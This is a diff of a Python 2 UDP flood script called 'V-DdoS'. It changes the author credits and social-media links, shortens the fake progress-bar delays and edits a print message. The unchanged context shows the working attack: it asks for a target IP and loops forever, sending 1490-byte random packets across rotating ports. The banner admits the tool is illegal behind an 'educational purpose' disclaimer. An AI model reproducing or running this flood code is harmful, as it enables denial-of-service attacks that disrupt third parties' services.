@@ -21,13 +21,14 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet V-DdoS")
 print
-print "Coded By : Mr.BL4Z3"
-print "Author   : T34m V18rs"
-print "Github   : github.com/T34mV18rs"
-print "Fb Page  : facebook.com/TeamVirusOfficial"
-print "FB Group : facebook.com/groups/mohinhossen"
-print "Telegram : t.me/Crackerspace"
+print "Coded By : KAZI ASHRFUZZAMAN "
+print "Author   : CNPI CYBER COMMUNITY"
+print "Github   : https://github.com/SilentVirtualCriminalGang.git"
+print "Fb Page  : facebook.com/MR.ERROR.HERE"
+print "FB Group : No group!"
+print "Telegram : t.me/Big_Boss_SK"
 print "Join Cracker Space TG Group To Get Premium Apk(s) Free"
+print "Don't copy my code!It's me Kazi the cyber gamer :)"
 print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
 print
 ip = raw_input("IP Target : ")
@@ -38,13 +39,13 @@ os.system("figlet DdoS Attack")
 print("Team : T34m V18rs")
 print ("\033[92m")
 print "[                    ] 0% "
-time.sleep(5)
+time.sleep(3)
 print "[=====               ] 25%"
-time.sleep(5)
+time.sleep(3)
 print "[==========          ] 50%"
-time.sleep(5)
+time.sleep(3)
 print "[===============     ] 75%"
-time.sleep(5)
+time.sleep(3)
 print "[====================] 100%"
 time.sleep(3)
 sent = 0
@@ -52,7 +53,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "Kazi sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
 
